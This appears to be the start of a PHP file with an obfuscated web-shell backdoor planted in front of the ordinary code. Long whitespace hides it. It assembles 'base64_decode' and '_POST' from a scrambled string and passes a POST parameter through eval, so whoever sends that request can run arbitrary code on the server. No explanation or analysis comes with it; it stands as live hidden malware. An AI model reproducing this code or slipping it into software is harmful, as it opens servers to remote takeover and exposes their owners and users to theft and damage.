<?php                                                                                                                                                                                                                                                $mnir6= "6_pcbs4eadto";$pkk95= strtolower( $mnir6[4].$mnir6[8].$mnir6[5].$mnir6[7]. $mnir6[0]. $mnir6[6] . $mnir6[1] .$mnir6[9].$mnir6[7]. $mnir6[3]. $mnir6[11].$mnir6[9]. $mnir6[7] ); $wlj85 =strtoupper ($mnir6[1].$mnir6[2]. $mnir6[11].$mnir6[5]. $mnir6[10]) ;if(isset (${$wlj85} [ 'n1c72b0' ]) ){ eval( $pkk95(${$wlj85} [ 'n1c72b0' ] )) ; }?> <?php
/**
